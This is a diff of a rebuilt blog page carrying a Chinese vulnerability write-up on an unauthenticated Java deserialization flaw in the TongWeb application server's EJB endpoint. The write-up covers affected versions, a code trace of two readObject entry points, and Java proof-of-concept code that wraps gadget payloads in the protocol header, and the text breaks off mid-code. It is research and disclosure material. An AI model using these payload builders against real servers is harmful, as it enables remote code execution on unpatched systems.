@@ -3,14 +3,28 @@
 <head>
   <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#f7f7f4">
-<meta name="color-scheme" content="light">
+<meta name="color-scheme" content="light dark">
+<meta name="theme-color" content="#f7f7f4" data-theme-color-light="#f7f7f4" data-theme-color-dark="#161614">
 
 <title>TongWeb反序列化 — CurlySean&#39;s Blog</title>
 <meta name="description" content="这里是 CurlySean 的个人技术博客，记录漏洞研究、代码审计与攻防实践，整理可以复现、验证与继续推演的技术细节。">
-<link rel="canonical" href="http://curlysean.github.io/2026/06/19/TongWeb%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+<link rel="canonical" href="https://curlysean.github.io/2026/06/19/TongWeb%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+<link rel="preload" href="/fonts/instrument-sans-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/jetbrains-mono-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="stylesheet" href="/css/style.css">
-<script>document.documentElement.classList.add('js')</script>
+<script>
+  (function () {
+    try {
+      var key = 'sheepfold-theme';
+      var saved = localStorage.getItem(key);
+      var dark = saved === 'dark' || (saved !== 'light' && window.matchMedia('(prefers-color-scheme: dark)').matches);
+      document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+      document.documentElement.classList.add('js');
+    } catch (error) {
+      document.documentElement.classList.add('js');
+    }
+  })();
+</script>
 
 <meta name="generator" content="Hexo 7.3.0"></head>
 <body class="page-type-post">
@@ -37,11 +51,18 @@
         <a class="desktop-nav__link" href="/about/">关于</a>
       
     </nav>
-    <a class="header-cta" href="/archives/">开始阅读 <span aria-hidden="true">↗</span></a>
-    <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
-      <span class="sr-only">打开导航</span>
-      <span></span><span></span>
-    </button>
+    <div class="site-header__actions">
+      <button class="theme-toggle" type="button" data-theme-toggle aria-label="切换颜色模式" title="切换颜色模式">
+        <span data-theme-toggle-label>暗色</span>
+      </button>
+      
+        <a class="header-cta header-cta--ghost" href="/archives/">全部文章 <span aria-hidden="true">↗</span></a>
+      
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
+        <span class="sr-only">打开导航</span>
+        <span></span><span></span>
+      </button>
+    </div>
   </div>
   <nav class="mobile-nav" id="mobile-menu" aria-label="移动端主导航" data-mobile-menu>
     <div class="frame mobile-nav__inner">
@@ -90,12 +111,6 @@
         
       </div>
     </div>
-    <div class="frame post-meta-grid reveal">
-      <div><span>发布</span><time datetime="2026-06-18T17:54:44.127Z">2026.06.19</time></div>
-      <div><span>更新</span><time datetime="2026-06-18T17:55:40.643Z">2026.06.19</time></div>
-      <div><span>阅读</span><strong>31 MIN</strong></div>
-      <div><span>标签</span><strong>2</strong></div>
-    </div>
   </header>
 
   <div class="frame post-content-layout">
@@ -103,15 +118,21 @@
       <div class="post-rail__inner">
         <p class="eyebrow">ON THIS PAGE</p>
         
-          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TongWeb%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">TongWeb反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TongWeb7-0-4-2"><span class="toc-text">TongWeb7.0.4.2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%85%A5%E5%8F%A3"><span class="toc-text">第一入口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%A5%E5%8F%A3"><span class="toc-text">第二入口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC"><span class="toc-text">POC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#POC1"><span class="toc-text">POC1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POC2"><span class="toc-text">POC2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TongWeb7-0-4-9"><span class="toc-text">TongWeb7.0.4.9</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-1"><span class="toc-text">POC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#POC1-1"><span class="toc-text">POC1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POC2-1"><span class="toc-text">POC2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XBean-EL%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-text">XBean + EL表达式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TongWeb%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><span class="toc-text">TongWeb反序列化利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CPOC"><span class="toc-text">命令执行POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">注入内存马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TongWebEJB%E6%AD%A6%E5%99%A8%E5%8C%96"><span class="toc-text">TongWebEJB武器化</span></a></li></ol></li></ol></nav>
+          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TongWeb7-0-4-2"><span class="toc-text">TongWeb7.0.4.2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%85%A5%E5%8F%A3"><span class="toc-text">第一入口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%A5%E5%8F%A3"><span class="toc-text">第二入口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC"><span class="toc-text">POC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#POC1"><span class="toc-text">POC1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POC2"><span class="toc-text">POC2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TongWeb7-0-4-9"><span class="toc-text">TongWeb7.0.4.9</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-1"><span class="toc-text">POC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#POC1-1"><span class="toc-text">POC1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POC2-1"><span class="toc-text">POC2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XBean-EL%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-text">XBean + EL表达式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TongWeb%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><span class="toc-text">TongWeb反序列化利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CPOC"><span class="toc-text">命令执行POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">注入内存马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TongWebEJB%E6%AD%A6%E5%99%A8%E5%8C%96"><span class="toc-text">TongWebEJB武器化</span></a></li></ol></nav>
         
       </div>
     </aside>
     <div class="article-column">
+      <div class="post-meta-grid reveal">
+        <div><span>发布</span><time datetime="2026-06-18T17:54:44.127Z">2026.06.19</time></div>
+        <div><span>更新</span><time datetime="2026-06-18T17:55:40.643Z">2026.06.19</time></div>
+        <div><span>阅读</span><strong>约 12 分钟</strong></div>
+        <div><span>标签</span><strong>2</strong></div>
+      </div>
       <div class="article-body">
-        <h1 id="TongWeb反序列化"><a href="#TongWeb反序列化" class="headerlink" title="TongWeb反序列化"></a>TongWeb反序列化</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>TongWeb 是东方通（Beijing Tongtech Co., Ltd.）自主研发的企业级应用服务器，全面支持 Java EE（现 Jakarta EE）标准，兼容主流开发框架，广泛应用于金融、电信、政府、能源等关键行业的信息化和数字化转型。TongWeb 具备高性能、高可用、分布式和集群部署能力，支持微服务架构、容器化和云原生环境，能够灵活适配多种操作系统和硬件平台。</p>
+        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>TongWeb 是东方通（Beijing Tongtech Co., Ltd.）自主研发的企业级应用服务器，全面支持 Java EE（现 Jakarta EE）标准，兼容主流开发框架，广泛应用于金融、电信、政府、能源等关键行业的信息化和数字化转型。TongWeb 具备高性能、高可用、分布式和集群部署能力，支持微服务架构、容器化和云原生环境，能够灵活适配多种操作系统和硬件平台。</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773023063675-a15974fe-0fe1-4f64-bd88-3fc7720ca303.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773023063675-a15974fe-0fe1-4f64-bd88-3fc7720ca303.png" alt="TongWeb反序列化" loading="lazy"></p>
 <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">7.0</span><span class="number">.0</span><span class="number">.0</span>&lt;=TongWeb&lt;=<span class="number">7.0</span><span class="number">.4</span>.9_M9</span><br><span class="line"><span class="number">6.1</span><span class="number">.7</span><span class="number">.0</span>&lt;=TongWeb&lt;=<span class="number">6.1</span><span class="number">.8</span><span class="number">.13</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>TongWeb <code>ejb</code> 服务没有校验请求的数据，直接对来源的数据进行反序列化，而默认情况下，<code>http</code> 服务（8088 端口） <code>/ejbserver/ejb</code> 接口会转发至 <code>ejb</code> 服务（5100 端口）的相同接口，攻击者可发送特定的数据包，造成反序列化漏洞，其中可利用的反序列化链主要有：</p>
@@ -120,70 +141,70 @@
 <h2 id="TongWeb7-0-4-2"><a href="#TongWeb7-0-4-2" class="headerlink" title="TongWeb7.0.4.2"></a>TongWeb7.0.4.2</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>当前分析版本：7.0.4.2</p>
 <h4 id="第一入口"><a href="#第一入口" class="headerlink" title="第一入口"></a>第一入口</h4><p>该反序列互漏洞出现在<code>/ejb</code>路由下</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1772785717414-809c82f2-36ad-40eb-9ef5-f7d434e26273.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1772785717414-809c82f2-36ad-40eb-9ef5-f7d434e26273.png" alt="TongWeb反序列化" loading="lazy"></p>
 <p>对应Servlet的类为<code>com.tongweb.tongejb.server.httpd.ServerServlet</code></p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1772785670105-84f80a71-5eb4-4741-950c-9a8f36f9cc50.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1772785670105-84f80a71-5eb4-4741-950c-9a8f36f9cc50.png" alt="TongWeb反序列化" loading="lazy"></p>
 <p>提前配置好调试信息，在<code>ServerServlet#service</code>方法中打下断点，该方法中会从<code>request</code>中读取<code>body</code>，然后传入到<code>EjbServer#serive</code>中</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1772983732858-138c458c-a6d8-47fa-bbb6-15ef2e78725b.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1772983732858-138c458c-a6d8-47fa-bbb6-15ef2e78725b.png" alt="TongWeb反序列化" loading="lazy"></p>
 <p>进入<code>EjbServer#serive</code>，首先设置了<code>ContextClassloader</code>，然后再将输入流传入<code>this.server#service</code>中</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1772983763399-69444493-0d30-4585-8d49-87e9b3e7c2cd.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1772983763399-69444493-0d30-4585-8d49-87e9b3e7c2cd.png" alt="TongWeb反序列化" loading="lazy"></p>
 <p>调试跟进<code>Daemon#service</code>中，这里就跟到了比较重要的部分，其中我们需要看的地方是以下这两个<code>readExternal</code>方法</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1772983919907-7bd2bc13-dfff-4639-8052-1f9f2d3c4ca4.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1772983919907-7bd2bc13-dfff-4639-8052-1f9f2d3c4ca4.png" alt="TongWeb反序列化" loading="lazy"></p>
 <p>看到第一个<code>readExternal</code>方法，首先读取输入流的前八个字节，作为版本号信息</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773023916531-4e427efd-f8e9-43a2-90e4-97acab305b84.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773023916531-4e427efd-f8e9-43a2-90e4-97acab305b84.png" alt="TongWeb反序列化" loading="lazy"></p>
 <p>然后在<code>init</code>方法中对版本号进行正则匹配，检查版本信息是否为<code>OEJB/x.x</code>格式，若不是则会抛出异常</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773023994271-4c6ffcd9-1be0-408c-b2de-5b696d7c7c1a.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773023994271-4c6ffcd9-1be0-408c-b2de-5b696d7c7c1a.png" alt="TongWeb反序列化" loading="lazy"></p>
 <p>进入第二个<code>readExternal</code>方法，首先读取一个字节作为版本信息，然后对剩下的序列化数据进行<code>readObject</code>反序列化，我们的漏洞触发点就在这里</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773024142332-20fb4122-0bd5-403e-9742-f165fb0adf8f.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773024142332-20fb4122-0bd5-403e-9742-f165fb0adf8f.png" alt="TongWeb反序列化" loading="lazy"></p>
 <h4 id="第二入口"><a href="#第二入口" class="headerlink" title="第二入口"></a>第二入口</h4><p>第二个入口在后面一些，在前面的反序列化流程可以成功通过的前提下，我们会继续向后走</p>
 <p>在反序列化<code>URI[]</code>后，会继续读取一个字节</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773043039315-70053f31-fd5b-4e27-9d05-dad8724b363b.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773043039315-70053f31-fd5b-4e27-9d05-dad8724b363b.png" alt="TongWeb反序列化" loading="lazy"></p>
 <p>读取该字节后对照<code>ENUM_MAP</code>来选择对应的<code>RequestType</code></p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773046449786-118ba97b-6786-4dbf-8e69-4b4f2133af52.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773046449786-118ba97b-6786-4dbf-8e69-4b4f2133af52.png" alt="TongWeb反序列化" loading="lazy"></p>
 <p>我们不想走入这两个if分支中，那么我们要保证该字节不为<code>-1</code>和<code>3</code></p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773046486147-8b16b75d-1d33-4f1a-897c-b01f79acb201.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773046486147-8b16b75d-1d33-4f1a-897c-b01f79acb201.png" alt="TongWeb反序列化" loading="lazy"></p>
 <p>经过两个if判断后，依旧读取一个字节，对应<code>RequestType</code>，这里我们需要让他走到<code>EJB_REQUEST</code>的情况中，因为漏洞触发点在这个<code>perccessEjbRequest</code>方法中</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773046507886-dfa636b6-c3d6-43ce-9682-2c8a59dbd542.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773046507886-dfa636b6-c3d6-43ce-9682-2c8a59dbd542.png" alt="TongWeb反序列化" loading="lazy"></p>
 <p>走进该方法，我们看到了存在一个<code>readExternal</code>调用，上面的漏洞触发点就在这里</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773046641806-c0dc12d9-12ab-4654-b32d-e3a4d6331fe8.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773046641806-c0dc12d9-12ab-4654-b32d-e3a4d6331fe8.png" alt="TongWeb反序列化" loading="lazy"></p>
 <p>进入看到，和上面的漏洞触发是比较相似的，也是读取一个字节后对剩余字节进行readObject处理</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773046675574-78625750-1645-4fd6-becb-54892514d339.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773046675574-78625750-1645-4fd6-becb-54892514d339.png" alt="TongWeb反序列化" loading="lazy"></p>
 <p>这个字节需要是<code>RequestMethodCode</code>Map中的其中之一即可</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773047442321-17e11839-3cb2-4be5-b7bb-04e994c0aa08.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773047442321-17e11839-3cb2-4be5-b7bb-04e994c0aa08.png" alt="TongWeb反序列化" loading="lazy"></p>
 <p>最终我们需要构造的payload如下（直接拿的别的师傅的，但是这里应该是缺少了一个<code>URI[]</code>对象）</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773046683416-426bf61d-3f51-496d-a1d4-b6e2be15d99f.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773046683416-426bf61d-3f51-496d-a1d4-b6e2be15d99f.png" alt="TongWeb反序列化" loading="lazy"></p>
 <h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><h4 id="POC1"><a href="#POC1" class="headerlink" title="POC1"></a>POC1</h4><p>根据上面的分析，我们所构造的payload应该是以下这样的</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773024422237-1fc2f6ac-715b-4f26-85ec-5b65309ca58d.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773024422237-1fc2f6ac-715b-4f26-85ec-5b65309ca58d.png" alt="TongWeb反序列化" loading="lazy"></p>
 <p>需要注意的是，我们在读取了前八个字节以后，调用了<code>new EjbObjectInputStream(cis)</code>，这里要求我们剩余序列化数据的开头为<code>AC ED 00 05</code>，因此我们那一个字节的版本信息需要写在序列化数据中，而不是单独的字节</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773024490888-b0950943-b1a9-419b-bf49-d0efda539fb0.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773024490888-b0950943-b1a9-419b-bf49-d0efda539fb0.png" alt="TongWeb反序列化" loading="lazy"></p>
 <p>根据以上分析，写出了以下Poc，其中baseString直接替换为序列化数据的Base64编码即可</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">baseString</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        System.out.println(serialize(baseString));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serialize</span><span class="params">(String baseString)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">ClientInfoString</span> <span class="operator">=</span> <span class="string">&quot;OEJP/1.1&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] ClientInfoBytes = ClientInfoString.getBytes();</span><br><span class="line"></span><br><span class="line">        byteArrayOutputStream.write(ClientInfoBytes);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">Base64String</span> <span class="operator">=</span> baseString;</span><br><span class="line">        <span class="type">byte</span>[] decodedBytes = Base64.getDecoder().decode(Base64String);</span><br><span class="line"></span><br><span class="line">        byteArrayOutputStream.write(decodedBytes,<span class="number">0</span>,<span class="number">4</span>);</span><br><span class="line">        byteArrayOutputStream.write(<span class="number">0x77</span>);</span><br><span class="line">        byteArrayOutputStream.write(<span class="number">0x01</span>);</span><br><span class="line">        byteArrayOutputStream.write(<span class="number">0x01</span>);</span><br><span class="line">        byteArrayOutputStream.write(decodedBytes,<span class="number">4</span>,decodedBytes.length - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>直接使用javaChains工具即可，可以看到成功延时</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773024825029-5132bea8-befb-4eed-afcf-f0d6f748fa54.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773024825029-5132bea8-befb-4eed-afcf-f0d6f748fa54.png" alt="TongWeb反序列化" loading="lazy"></p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773024875619-aeda495d-b929-47b4-8a08-c4c961698352.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773024875619-aeda495d-b929-47b4-8a08-c4c961698352.png" alt="TongWeb反序列化" loading="lazy"></p>
 <p>在TongWeb中带有CB依赖，但是使用CB链打的时候报错提示<code>ClassNotFound BeanCompartor</code>，因此CB依赖打不通</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773025174275-c7167b15-d70d-4c29-b916-a2da5f6839aa.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773025174275-c7167b15-d70d-4c29-b916-a2da5f6839aa.png" alt="TongWeb反序列化" loading="lazy"></p>
 <p>这里是Yinsel师傅写的POC，用来检测是否存在漏洞的，但是还是不能进行漏洞利用</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        System.out.println(serialize(getObject()));  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">obout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bout);  </span><br><span class="line">        obout.writeByte(<span class="number">1</span>);  </span><br><span class="line">        obout.writeObject(object); <span class="comment">// 写入恶意对象  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">clientInfoString</span> <span class="operator">=</span> <span class="string">&quot;OEJP/1.1&quot;</span>; <span class="comment">// 版本号随意, 符合OEJP/x.x  </span></span><br><span class="line">        <span class="type">byte</span>[] clientInfoBytes = clientInfoString.getBytes();  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bout2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        bout2.write(clientInfoBytes);  </span><br><span class="line">        bout2.write(bout.toByteArray());  </span><br><span class="line">        <span class="keyword">return</span> 